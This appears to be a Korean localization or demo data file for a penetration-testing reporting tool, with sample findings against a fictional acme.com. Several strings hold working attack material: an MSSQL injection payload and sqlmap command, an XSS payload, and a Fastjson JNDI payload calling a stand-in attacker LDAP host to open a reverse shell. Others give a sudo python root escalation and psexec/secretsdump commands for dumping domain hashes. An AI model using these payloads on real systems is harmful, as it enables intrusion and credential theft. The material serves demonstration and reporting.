  m2437: "shop.acme.com 결제 및 주문 흐름",
  m2438: "결제 및 주문 엔드포인트의 권한 검증, 금액 변조 및 경쟁 상태 위험을 평가합니다.",
  m2439: "외부 노출면 정찰(VPN / 경계 서비스)",
  m2440: "acme.com이 외부에 노출한 경계 서비스의 악용 가능성을 확인합니다.",
  m2441: "외부 웹 평가",
  m2442: "인터넷에 노출된 대상을 블랙박스 테스트하며 사이트, API 및 일반적인 관리자 진입점을 확인합니다.",
  m2443: "비인가 접근, 민감 정보 노출 또는 서버 침해를 유발할 수 있는 보안 문제를 식별하고 검증합니다.",
  m2444: "API 권한 검증 평가",
  m2445: "API 인증, 객체별 권한 검증 및 역할 경계를 집중 테스트합니다.",
  m2446: "IDOR, 수평·수직 권한 상승 및 대량 데이터 접근 위험을 확인합니다.",
  m2447: "루트 도메인",
  m2448: "데모 ICP 등록 2021xxxx",
  m2449: "Acme 웹사이트",
  m2450: "Acme Corp — 기업 웹사이트",
  m2451: "관리자",
  m2452: "Acme 관리자 로그인",
  m2453: "Jenkins(내부)",
  m2454: "웹사이트 검색의 오류 기반 SQL 주입",
  m2455:
    '## 취약점 개요\n\n`www.acme.com/search`의 `q` 매개변수에 **오류 기반 SQL 주입**(MSSQL)이 있어 데이터베이스 버전, 구조 및 민감한 데이터가 노출될 수 있습니다.\n\n## 영향\n\n- `acme_prod` 구조와 사용자·주문 데이터 읽기 가능\n- 오류 응답으로 악용이 쉬워 위험도 높음\n\n## 재현\n\n1. 오류 기반 주입 실행:\n\n```\nGET /search?q=1\' AND 1=CONVERT(int,@@version)--\n```\n\n2. 응답에 MSSQL 버전 오류가 표시되어 주입 가능 확인\n3. 데이터베이스 열거: `sqlmap -u "https://www.acme.com/search?q=1" --dbs`\n\n## 수정 권고\n\n- 문자열 결합 대신 매개변수화된 쿼리·준비된 구문 사용\n- 운영 환경의 상세 오류 응답 비활성화\n- 데이터베이스 계정에 최소 권한 적용 및 `xp_cmdshell` 등 위험 확장 비활성화\n',
  m2456: "www.acme.com/search q 매개변수의 오류 기반 SQL 주입",
  m2457: "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → MSSQL 버전 오류 반환, 구조 읽기 가능.",
  m2458: "Acme 웹사이트 및 관리자 외부 평가",
  m2459: "api.acme.com/v1/orders?id=의 IDOR로 다른 사용자 주문 노출",
  m2460: "id=1001을 id=1002로 바꾸면 주소와 전화번호를 포함한 다른 사용자 주문이 반환됩니다. 소유권 확인이 없습니다.",
  m2461: "약한 API JWT 비밀키로 오프라인 해독 및 위조 가능",
  m2462: "HS256 비밀키 'secret'을 john으로 5초 만에 해독하여 임의 sub를 위조하고 권한 검증을 우회할 수 있습니다.",
  m2463: "검색 페이지의 이스케이프되지 않은 q 매개변수로 반사형 XSS 발생",
  m2464: "q=<script>alert(document.domain)</script>가 결과 제목에 그대로 반영됩니다.",
  m2465: "www.acme.com의 .git 노출로 소스 복원 가능",
  m2466: "GET /.git/HEAD → 200. git-dumper로 백엔드 소스와 데이터베이스 연결 문자열 주석을 복원했습니다.",
  m2467: "admin.acme.com이 기본 자격 증명 admin/admin123 사용",
  m2468: "로그인에 성공했으며 관리자 콘솔에서 사용자와 주문을 관리할 수 있습니다.",
  m2469: "로그인 후 next 매개변수를 통한 임의 리디렉션",
  m2470: "/login?next=https://evil.example이 로그인 후 HTTP 302로 외부 사이트에 이동합니다.",
  m2471: "로그인 엔드포인트에 속도 제한이 없어 무차별 대입 가능",
  m2472: "분당 1,000회 시도에도 잠금이나 CAPTCHA가 없습니다.",
  m2473: "API 500 오류가 스택, 경로 및 프레임워크 버전 노출",
  m2474: "500 오류를 유발하면 절대 경로와 의존성 버전을 포함한 Node.js 스택이 반환됩니다.",
  m2475: "쇼핑몰이 알려진 RCE가 있는 구버전 구성 요소 사용",
  m2476: "핑거프린트에서 구성 요소 v2.3.1을 확인했으며 CVE-2024-xxxx 역직렬화 RCE와 연관됩니다.",
  m2477: "유출 소스에 데이터베이스 자격 증명 sa/Acme@2021 하드코딩",
  m2478:
    "git-dumper로 www.acme.com/.git에서 config.php를 복원했으며 평문 데이터베이스 비밀번호는 이후 내부망에서도 재사용 가능함을 확인했습니다.",
  m2479: "쇼핑몰 Fastjson 역직렬화 원격 명령 실행",
  m2480:
    '## 취약점 개요\n\n`shop.acme.com/api/import`는 **Fastjson 1.2.24**로 사용자 제어 JSON을 처리하며 `safeMode`가 꺼져 있습니다. `@type`으로 임의 클래스를 지정하여 **JNDI 주입 → 원격 명령 실행**이 가능합니다.\n\n## 영향\n\n- 인증 없이 DMZ 웹 서버에서 임의 명령 실행(`www-data@dmz-web01`)\n- 권한 상승과 결합하면 내부망 진입점 제공\n\n## 재현\n\n1. JNDI 페이로드 구성:\n\n```json\n{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}\n```\n\n2. `POST /api/import`, `Content-Type: application/json`\n3. 대상이 dnslog로 연결하고 리버스 셸을 엶\n\n## 수정 권고\n\n- Fastjson을 **1.2.83 이상**으로 업그레이드하고 `safeMode` 활성화\n- `/api/import`에 인증 및 출처 검증 추가\n- 외부 연결 제한: 애플리케이션 서버의 LDAP/RMI 외부 연결 금지\n',
  m2481: "shop.acme.com Fastjson 1.2.24 역직렬화 원격 명령 실행",
  m2482: "POST /api/import에 JNDI 페이로드(@type:JdbcRowSetImpl) 제출 → dnslog 연결 및 리버스 셸(www-data@dmz-web01).",
  m2483: "DMZ의 sudo NOPASSWD 설정 오류로 로컬 root 권한 상승 가능",
  m2484:
    "sudo -l에 (ALL) NOPASSWD: /usr/bin/python3 표시 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")'로 바로 root 확보.",
  m2485: "이중 네트워크 DMZ 호스트가 내부망 격리 우회",
  m2486:
    "dmz-web01의 두 번째 인터페이스가 10.10.10.0/24에 있어 DMZ에서 도메인 컨트롤러, 파일 서버 및 Jenkins에 직접 접근하여 망 분리를 우회합니다.",
  m2487: "내부 Jenkins Script Console 미인증 원격 명령 실행",
  m2488:
    "GET /script에서 로그인 없이 Groovy 실행: 'whoami'.execute().text → SYSTEM. 자격 증명 저장소에서 도메인 계정 acme\\\\svc_deploy를 추출했습니다.",
  m2489: "도메인 서비스 계정 svc_sql의 Kerberoasting 가능 및 약한 비밀번호",
  m2490:
    "GetUserSPNs로 svc_sql의 TGS를 요청하고 hashcat -m 13100으로 Sql@2020을 오프라인 해독했습니다. 이 계정은 SQL 관리자 그룹에 속합니다.",
  m2491: "내부 도메인 컨트롤러 DC01 전체 제어(Domain Admin)",
  m2492:
    "## 취약점 개요\n\n외부 Fastjson RCE로 DMZ에 진입한 후 sudo 권한 상승, 이중 네트워크 호스트 및 Jenkins 미인증 RCE로 `svc_deploy`를 확보했습니다. 이 계정은 **Domain Admins** 소속으로 **DC01** 전체 제어가 가능했습니다.\n\n## 영향\n\n- 도메인 관리자 권한으로 도메인 호스트 및 계정 제어\n- `secretsdump`로 `krbtgt`를 포함한 도메인 전체 NTLM 해시 추출, 골든 티켓을 통한 장기 접근 가능\n- 내부 대상 목표 달성\n\n## 재현\n\n1. `svc_deploy`로 로그인하고 해시 추출:\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. DC01의 SYSTEM 권한 확보 및 도메인 전체 해시 추출\n\n## 수정 권고\n\n- 서비스 계정 권한 축소, Domain Admins 제외 및 계층별 관리 적용\n- `krbtgt` 두 차례 초기화 및 강력한 서비스 계정 비밀번호로 교체\n- DMZ와 내부망 격리 및 앞선 RCE·권한 상승 경로 수정\n",
  m2493: "DC01 도메인 컨트롤러 제어(Domain Admin) — 내부 목표 달성",
  m2494:
    "svc_deploy는 Domain Admins 소속입니다. psexec.py로 DC01 SYSTEM을 확보하고 secretsdump로 krbtgt 포함 도메인 NTLM 해시를 추출하여 대상 제어를 완료했습니다.",
  m2495: "루트: acme.com 외부→내부 심층 평가",
  m2496: "acme.com 관리자 접근 권한 확보",
